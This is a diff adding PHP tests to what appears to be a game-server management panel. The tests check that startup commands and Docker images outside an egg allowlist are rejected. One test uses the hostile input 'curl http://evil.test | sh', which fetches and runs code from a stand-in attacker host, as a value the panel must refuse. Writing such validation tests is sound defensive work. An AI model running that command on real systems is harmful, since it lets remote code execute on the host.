@@ -65,3 +65,48 @@ it('updates a startup variable on the tenant server', function () {
 
     expect($variable->refresh()->variable_value)->toBe('changed');
 });
+
+it('allows selecting a startup command inside the egg allowlist', function () {
+    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
+    $server->egg->forceFill(['startup_commands' => ['java -jar test.jar', 'java -jar other.jar']])->saveOrFail();
+    $server->forceFill(['startup' => 'java -jar test.jar'])->saveOrFail();
+
+    $this->actingAs($user);
+    Filament::setTenant($server);
+
+    livewire(Startup::class)
+        ->set('data.startup_select', 'java -jar other.jar')
+        ->assertSuccessful();
+
+    expect($server->refresh()->startup)->toBe('java -jar other.jar');
+});
+
+it('rejects a startup command outside the egg allowlist', function () {
+    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
+    $server->egg->forceFill(['startup_commands' => ['java -jar test.jar']])->saveOrFail();
+    $server->forceFill(['startup' => 'java -jar test.jar'])->saveOrFail();
+
+    $this->actingAs($user);
+    Filament::setTenant($server);
+
+    livewire(Startup::class)
+        ->set('data.startup_select', 'curl http://evil.test | sh')
+        ->assertStatus(422);
+
+    expect($server->refresh()->startup)->toBe('java -jar test.jar');
+});
+
+it('rejects a docker image outside the egg allowlist', function () {
+    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupDockerImage]);
+    $server->egg->forceFill(['docker_images' => ['ghcr.io/pelican-eggs/yolks:java_21']])->saveOrFail();
+    $server->forceFill(['image' => 'ghcr.io/pelican-eggs/yolks:java_21'])->saveOrFail();
+
+    $this->actingAs($user);
+    Filament::setTenant($server);
+
+    livewire(Startup::class)
+        ->set('data.image', 'evil/malicious:latest')
+        ->assertStatus(422);
+
+    expect($server->refresh()->image)->toBe('ghcr.io/pelican-eggs/yolks:java_21');
+});
